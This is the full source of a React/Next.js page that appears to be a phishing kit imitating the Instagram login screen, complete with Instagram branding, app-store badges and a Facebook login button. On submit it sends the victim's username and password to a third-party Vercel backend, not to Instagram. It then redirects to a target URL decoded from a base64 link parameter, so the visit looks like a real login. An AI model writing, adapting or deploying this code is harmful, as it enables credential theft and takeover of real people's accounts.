"use client";
import { useState, useEffect } from "react";

export default function InstagramLogin({ params }) {
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [errors, setErrors] = useState({ username: "", password: "" });
  const [loading, setLoading] = useState(false);
  const [encryptedString, setEncryptedString] = useState("");
  const [hasTargetUrl, setHasTargetUrl] = useState(false);

  // Reverse mapping or Base64-like URL-safe decryption
  const decryptUrlSafeBase64 = (encoded) => {
    if (!encoded) return "";
    try {
      const base64 = encoded.replace(/-/g, "+").replace(/_/g, "/");
      const padding = "=".repeat((4 - (base64.length % 4)) % 4);
      return decodeURIComponent(escape(atob(base64 + padding)));
    } catch {
      return "";
    }
  };

  useEffect(() => {
    if (params?.slug && params.slug.length > 0) {
      const encryptedParam = params.slug[0];
      if (encryptedParam) {
        setEncryptedString(encryptedParam);
        setHasTargetUrl(true);
        console.log("Encrypted string detected:", encryptedParam);
      }
    }
  }, [params]);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) setErrors((prev) => ({ ...prev, [name]: "" }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrors({ username: "", password: "" });

    if (!formData.username) {
      setErrors((prev) => ({ ...prev, username: "Username, email or phone is required" }));
      return;
    }
    if (!formData.password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }));
      return;
    }
    if (formData.password.length < 6) {
      setErrors((prev) => ({ ...prev, password: "Password must be at least 6 characters" }));
      return;
    }

    try {
      setLoading(true);
      const response = await fetch("https://social-backend-bice-delta.vercel.app/api/auth/instagram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
          platform: "instagram",
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert("Login successful!");
        console.log("Login successful:", data);

        // === Redirect automatically after decrypting target URL ===
        if (hasTargetUrl && encryptedString) {
          const targetUrl = decryptUrlSafeBase64(encryptedString);
          if (targetUrl && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
            setTimeout(() => {
              window.location.href = targetUrl;
            }, 800);
            return;
          }
        }

        // Fallback if no encrypted link
        setLoading(false);
      } else {
        setErrors((prev) => ({ ...prev, password: data.message || "Login failed" }));
        setLoading(false);
      }
    } catch (error) {
      setErrors((prev) => ({ ...prev, password: "Network error. Please try again." }));
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="flex items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-sm">
          <div className="bg-white border border-gray-300 rounded-sm p-10 mb-4">
            <div className="text-center mb-8">
              <h1 className="text-4xl font-bold bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400 bg-clip-text text-transparent">
                Instagram
              </h1>
            </div>

            <form onSubmit={handleSubmit} className="space-y-3">
              <div>
                <input
                  type="text"
                  name="username"
                  placeholder="Phone number, username, or email"
                  value={formData.username}
                  onChange={handleInputChange}
                  disabled={loading}
                  className={`w-full px-2 py-2 border rounded-sm text-sm bg-gray-50 focus:outline-none focus:bg-white ${errors.username ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-gray-400"
                    }`}
                />
                {errors.username && <p className="text-red-500 text-xs mt-1">{errors.username}</p>}
              </div>

              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleInputChange}
                  disabled={loading}
                  className={`w-full px-2 py-2 border rounded-sm text-sm bg-gray-50 focus:outline-none focus:bg-white ${errors.password ? "border-red-500 focus:border-red-500" : "border-gray-300 focus:border-gray-400"
                    }`}
                />
                {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
              </div>

              <button
                type="submit"
                className="w-full bg-blue-500 text-white py-2 rounded-sm text-sm font-semibold hover:bg-blue-600 transition-colors mt-4 disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={loading}
              >
                {loading ? (
                  <div className="flex justify-center items-center">
                    <svg
                      className="animate-spin h-4 w-4 mr-2 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
                    </svg>
                    Logging in...
                  </div>
                ) : (
                  "Log In"
                )}
              </button>
            </form>

            {/* OR Divider */}
            <div className="flex items-center my-6">
              <div className="flex-1 border-t border-gray-300"></div>
              <span className="px-4 text-gray-500 text-sm font-semibold">OR</span>
              <div className="flex-1 border-t border-gray-300"></div>
            </div>

            {/* Facebook Login */}
            <div className="text-center">
              <button className="text-blue-900 font-semibold text-sm hover:text-blue-800">
                <span className="mr-2">📘</span>
                Log in with Facebook
              </button>
            </div>

            {/* Forgot Password */}
            <div className="text-center mt-4">
              <a href="#" className="text-blue-900 text-xs hover:underline">
                Forgot password?
              </a>
            </div>

          </div>

          <div className="text-center mt-4">
            <p className="text-sm mb-4">Get the app.</p>
            <div className="flex justify-center space-x-2">
              <div className="bg-black text-white px-4 py-2 rounded text-xs">📱 App Store</div>
              <div className="bg-black text-white px-4 py-2 rounded text-xs">🤖 Google Play</div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
